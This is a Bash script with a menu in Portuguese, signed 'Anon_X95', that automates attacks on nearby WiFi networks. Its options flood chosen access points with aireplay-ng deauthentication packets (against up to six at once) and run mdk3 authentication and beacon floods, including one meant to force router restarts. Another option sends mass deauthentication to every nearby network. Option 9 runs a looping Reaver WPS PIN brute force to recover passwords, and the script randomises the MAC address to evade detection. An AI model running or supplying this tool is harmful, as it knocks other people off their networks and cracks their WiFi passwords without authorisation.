#!/bin/bash

airmon-ng check kill
clear
echo ""
iwconfig
echo ""
echo "Digite a Interface Para Colocar em Modo Monitor"
read WIRELLES
ifconfig $WIRELLES down
iwconfig $WIRELLES mode monitor
sleep 2
macchanger -r $WIRELLES
macchanger -r $WIRELLES
echo ""

while true
do
clear
echo "*********************************************************"
echo "****************** Selecione a Opção ********************"
echo "*********************************************************"
echo "**                                                    ***"
echo "** 1. Ataca uma Rede                                  ***"
echo "** 2. Ataca duas Redes                                ***"
echo "** 3. Ataca Uma Rede (Macchanger)                     ***"
echo "** 4. Ataca Com Mdk3,Aireplay-ng,Macchanger           ***"
echo "** 5. Forca o Reinicio do Roteador       	            ***"
echo "** 6. Mdk3 (Inundação SSID) Nomes Aleatorios          ***"
echo "** 7. Desautenticação em Massa Derruba Ate a Sua Rede ***"
echo "** 8. Ataca 6 Redes (Aireplay-ng)                     ***"
echo "** 9. Descobre ou Tenta a Senha Metodo WPS (Reaver)   ***"
echo "** 10. Reinicia Sua Placa(Normal)                     ***"
echo "** 11. Cria Redes Wifi com o nome que Escolher        ***"
echo "**                                                    ***"
echo "*********************************************************"
echo "**********            Anon_X95            ***************"
echo "*********************************************************"
echo ""

read n
echo ""
case $n in
1)clear
airodump-ng $WIRELLES --wps
echo "Informe o BSSID da Rede Alvo:"
read BSSID
[[ $BSSID == "" ]]
echo "Informe o CANAL da Rede Alvo:"
read CANAL
[[ $CANAL == "" ]]
echo "Informe o ESSID da Rede Alvo:"
read ESSID
[[ $ESSID == "" ]]
echo "Vamos Fixar o Canal na Interface"
clear
echo "Aguarde ..."
(xterm -title "$ESSID" -e airodump-ng $WIRELLES --bssid $BSSID --channel $CANAL)
clear
echo "Otimo agora o ataque começa aperte Crtl+c para encerrar o ataque"
read -p "Pressione Qualquer Tecla Para Iniciar o Ataque"
(xterm -e aireplay-ng -0 0 -a $BSSID $WIRELLES);;

2)clear
airodump-ng $WIRELLES --wps
echo "As Redes Alvos São Do Mesmo Canal y/n:"
read y
if [[ $y == "y" ]];then
echo "Otimo!"
echo "Informe o BSSID da 1 Rede Alvo:"
read BSSID
[[ $BSSID == "" ]]
echo "Informe o CANAL da Rede Alvo:"
read CANAL
[[ $CANAL == "" ]]
echo "Informe o ESSID da 1 Rede Alvo:"
read ESSID
[[ $ESSID == "" ]]
echo ""
echo "Informe o BSSID da 2 Rede Alvo:"
read DBSSID
[[ $DBSSID == "" ]]
echo "Informe o ESSID da 2 Rede Alvo:"
read DESSID
[[ $DESSID == "" ]]
echo "Vamos Fixar o Canal na Interface"
echo ""
(xterm -e airodump-ng $WIRELLES --channel $CANAL --wps)&
sleep 3
killall airodump-ng
(xterm -title "$ESSID" -e aireplay-ng -0 0 -a $BSSID $WIRELLES) &
sleep 2
(xterm -title "$DESSID" -e aireplay-ng -0 0 -a $DBSSID $WIRELLES) &
clear

else

echo "Informe o BSSID da 1 Rede Alvo:"
read BSSID
[[ $BSSID == "" ]]
echo "Informe o CANAL da 1 Rede:"
read CANAL
[[ $CANAL == "" ]]
echo "Informe o ESSID da 1 Rede:"
read ESSID
[[ $ESSID == "" ]]
echo "Informe o BSSID da 2 Rede Alvo:"
read DBSSID
[[ $DBSSID == "" ]]
echo "Informe o CANAL da 2 Rede:"
read OCANAL
[[ $OCANAL == "" ]]
echo "Informe o ESSID da 2 Rede Alvo:"
read BESSID
[[ $BESSID == "" ]]
echo ""
echo "Vamos Fixar a 1 Rede e Atacar:"
(xterm -e airodump-ng $WIRELLES --channel $CANAL --bssid $BSSID)&
sleep 2
(xterm -title "$ESSID" -e aireplay-ng -0 0 -a $BSSID $WIRELLES -e $ESSID ) &
killall airodump-ng
sleep 1
echo "Agora Vamos Pra 2 Rede:"
sleep 2
(xterm -e airodump-ng $WIRELLES --channel $OCANAL --bssid $DBSSID ) &
sleep 3
(xterm -title "$BESSID" -e aireplay-ng -0 0 -a $DBSSID $WIRELLES ) &
killall airodump-ng
echo ""
echo "Para Finalizar Aperte Ctrl+C"
fi ;;
3)clear
echo ""
echo "Bom Vamos Fazer Algo Mais Profissional"
echo "Esse Vai ser um Ataque Igual so Que com o Macchanger"
read -p "Aperte para Continuar"
airodump-ng $WIRELLES --wps
echo "Informe o BSSID da Rede Alvo:"
read BSSID
[[ $BSSID == "" ]]
echo "Informe o CANAL da Rede Alvo:"
read CANAL
[[ $CANAL == "" ]]
echo "Informe o ESSID da Rede Alvo:"
read ESSID
[[ $ESSID == "" ]]
echo "Informe o Numero de PACOTES a ser Enviado:"
read PACOTES
[[ $PACOTES == "" ]]
echo ""
echo "Vamos Utizar o Macchanger com Repetição"
echo ""
echo "Vamos Fixar o Canal Na Placa . . ."
read -p "Pressione alguma tecla para prosseguir"
(xterm -title "$ESSID" -e airodump-ng --bssid $BSSID --channel $CANAL --wps $WIRELLES ) &
sleep 2
clear
echo "Finalizando"
killall airodump-ng
for i in {1..5000}
do
aireplay-ng -0 $PACOTES -a $BSSID $WIRELLES
sleep 3
ifconfig $WIRELLES down
sleep 2
macchanger -r $WIRELLES
sleep 2
(xterm -title "$ESSID" -e airodump-ng --bssid $BSSID --channel $CANAL --wps $WIRELLES ) &
sleep 3
killall airodump-ng
done ;;
4)clear
echo "Bom esse ataque utiliza o MDK3 "
read -p "Aperte para prosseguir"
echo "Bom Vamos Lá:"
airodump-ng $WIRELLES
echo ""
echo "Informe o BSSID da Rede Alvo:"
read BSSID
[[ $BSSID == "" ]]
echo "Informe o CANAL da Rede Alvo:"
read CANAL
[[ $CANAL == "" ]]
echo "Informe o ESSID da Rede Alvo:"
read ESSID
[[ $ESSID == "" ]]
clear
echo "Vamos Fixar o Canal"
echo "Mas Antes Vamos Mudar o MAC da Placa :"
ifconfig $WIRELLES down
sleep 2
macchanger -r $WIRELLES
sleep 1
iwconfig $WIRELLES mode monitor
sleep 2
echo "Bom Agora Sim Mac Alterado"
sleep 1
(xterm -title "$ESSID" -e airodump-ng --bssid $BSSID --channel $CANAL --wps $WIRELLES) &
sleep 3
killall airodump-ng

echo ""
sleep 2
(xterm -title "$ESSID" -e aireplay-ng -0 0 -a $BSSID $WIRELLES) &
sleep 2
(xterm -title "MDK3" -e mdk3 $WIRELLES a -i $BSSID -s 1000) &
sleep 2
echo "Bom Isso e Tudo Pessoal !!!" ;;
5)clear

echo "Esse modo pode sobrecarregar a sua placa, entao talvez pode ter que reiniciar o script:"
echo ""
read -p "Aperte para continuar"
sleep 1
clear
airodump-ng $WIRELLES --wps
echo ""
echo "Informe o BSSID da Rede Alvo:"
read UBSSID
echo "Informe o CANAL da Rede Alvo:"
read UCANAL
echo ""
sleep 3
(xterm -title "Monitoramento da Rede" -e airodump-ng $WIRELLES --bssid $UBSSID --channel $UCANAL --wps) &
sleep 3
(xterm -title "Aireplay-ng" -e aireplay-ng -0 0 -a $UBSSID $WIRELLES) &
sleep 1
(xterm -title "Mdk3" -e mdk3 $WIRELLES a -a $UBSSID -s 10000) &
sleep 1
(xterm -title "Mdk3 2" -e mdk3 $WIRELLES m -t $UBSSID -j -w 60 -s 10000) &
sleep 1
echo ""
echo "Pronto, agora e so esperar"
;;

11)clear

echo ""
echo "Informe um nome para o SSID:"
read VARIAVEL 
for ins in {1..5000} ; do

echo $VARIAVEL$ins >> /tmp/ts.txt

done
(xterm -title "Redes Fakes" -e mdk3 $WIRELLES b -f /tmp/ts.txt -s 10000) &
sleep 10
;;


6)clear
echo "Vamos aos Seguintes Requistos Nessecidades:"
echo " 1 Wordlist Com SSIDS (Facil)"
echo "Voce Tem Uma Wordlist S/N:"
read S
if [[ $S == "S" ]];then
echo "Informe o Caminho Da Sua Wordlist:"
read CAMINHO
[[ $CAMINHO == "" ]]
(xterm -title "Redes Fakes" -e mdk3 $WIRELLES b -f $CAMINHO -s 10000 -c 1,2,3,4,5,6,7,8,9,10,11,12 ) &
sleep 2
else
[[ $N == "N" ]]
echo ""
echo "Bom Voce Não Tem Uma Wordlist Vamos Então Criar as Redes:"
echo ""
sleep 2
(xterm -title "Rede Fake" -e mdk3 $WIRELLES b -f- -s 10000 -c 1,2,3,4,5,6,7,8,9,10,11,12 ) &
sleep 3
fi ;;

7)clear
read -p "Aperte para prosseguir"
ifconfig $WIRELLES | awk '/HWaddr/ {print $5}' > /tmp/deauth-whitelist.txt

(xterm -title "Disconect" -e mdk3 $WIRELLES d -w /tmp/deauth-whitelist.txt -c 1,2,3,4,5,6,8,9,10,11) &
;;
8)clear
echo "Bom Esse Ataca Seis Redes e Isso Ai"
read -p "Aperte para prosseguir"
sleep 1
airodump-ng $WIRELLES --wps
echo "Digite o BSSID Da 1 Rede Alvo:"
read BSSID
[[ $BSSID == "" ]]
echo "Digite o CANAL Da 1 Rede Alvo:"
read CANAL
[[ $CANAL == "" ]]
echo "Digite o BSSID Da 2 Rede Alvo:"
read ABSSID
[[ $ABSSID == "" ]]
echo "Digite o CANAL Da 2 Rede Alvo:"
read ACANAL
[[ $ACANAL == "" ]]
echo "Digite o BSSID Da 3 Rede Alvo:"
read ZBSSID
[[ $ZBSSID == "" ]]
echo "Digite o CANAL Da 3 Rede Alvo:"
read ZCANAL
[[ $ZCANAL == "" ]]
echo "Digite o BSSID Da 4 Rede Alvo:"
read XBSSID
[[ $XBSSID == "" ]]
echo "Digite o CANAL Da 4 Rede Alvo:"
read XCANAL
[[ $XCANAL == "" ]]
echo "Digite o BSSID Da 5 Rede Alvo:"
read HBSSID
[[ $HBSSID == "" ]]
echo "Digite o CANAL Da 5 Rede Alvo:"
read HCANAL
[[ $HCANAL == "" ]]
echo "Digite o BSSID Da 6 Rede Alvo:"
read RBSSID
[[ $RBSSID == "" ]]
echo "Digite o CANAL Da 6 Rede Alvo:"
read RCANAL
[[ $RCANAL == "" ]]
clear
sleep 2
echo "Vamos Fixar Cada Canal e Começar o Ataque:"
read -p "Aperte Para Iniciar."
(xterm -e airodump-ng --bssid $BSSID --channel $CANAL $WIRELLES --wps) &
sleep 1
(xterm -e aireplay-ng -0 0 -a $BSSID $WIRELLES ) &
killall airodump-ng
sleep 1
(xterm -e airodump-ng --bssid $ABSSID --channel $ACANAL $WIRELLES --wps) &
sleep 1
(xterm -e aireplay-ng -0 0 -a $ABSSID $WIRELLES) &
killall airodump-ng
sleep 1
(xterm -e airodump-ng --bssid $ZBSSID --channel $ZCANAL $WIRELLES --wps) &
sleep 1
(xterm -e aireplay-ng -0 0 -a $ZBSSID $WIRELLES) &
sleep 1
killall airodump-ng
sleep 1
(xterm -e airodump-ng --bssid $XBSSID --channel $XCANAL $WIRELLES --wps) &
sleep 1
(xterm -e aireplay-ng -0 0 -a $XBSSID $WIRELLES) &
sleep 1
killall airodump-ng
sleep 1
(xterm -e airodump-ng --bssid $HBSSID --channel $HCANAL $WIRELLES --wps) &
sleep 1
(xterm -e aireplay-ng -0 0 -a $HBSSID $WIRELLES) &
sleep 1
killall airodump-ng
sleep 1
(xterm -e airodump-ng --bssid $RBSSID --channel $RCANAL $WIRELLES --wps) &
sleep 1
(xterm -e aireplay-ng -0 0 -a $RBSSID $WIRELLES) &
sleep 1
killall airodump-ng
sleep 3
;;
9)clear
echo "Bom Ele tentar Quebra a Senha Pelo WPS Sem o Roteador "Perceber!" "
echo "Vamos Iniciar !!!"
read -p "Aperte para prosseguir"
airodump-ng $WIRELLES --wps 
echo "Informe o BSSID Da Rede Alvo com WPS:"
read BSSID
[[ $BSSID == "" ]]
echo "Informe o CANAL Da Rede Alvo:"
read CANAL
[[ $CANAL == "" ]]
echo "Informe o ESSID Da Rede Alvo:"
read ESSID
[[ $ESSID == "" ]]
echo ""
echo "Vamos Fixar o Canal na Placa . . ."
sleep 1
(xterm -title "$ESSID" -e airodump-ng $WIRELLES --bssid $BSSID --channel $CANAL --wps ) &
sleep 2
killall airodump-ng
echo ""
clear
while :; do echo
echo "Iniciando o Reaver . . .";
echo y|reaver -i $WIRELLES -b $BSSID -c $CANAL -g 3 -vv -K
echo ...
echo ...
echo ...
(xterm -e mdk3 $WIRELLES a -a $BSSID -m -s 100) &
sleep 30
killall mdk3
(xterm -e aireplay-ng -0 0 -a $BSSID $WIRELLES ) &
sleep 30
killall aireplay-ng
(xterm -e mdk3 $WIRELLES x 0 -t $BSSID -n "$ESSID" -s 250) &
sleep 30
killall mdk3
sleep 3
clear
done
;;
10)clear
echo "Deseja Voltar Sua Placa ao Modo Manager(Normal)y/n:"
read y
if [[ $y == "y" ]];then
echo "OK! Iniciando Placa-Network"
service network-manager restart
iwconfig $WIRELLES mode managed
ifconfig $WIRELLES up
sleep 1
echo "Concluído"
echo""

else

echo "Ok"
fi ;;

esac
done
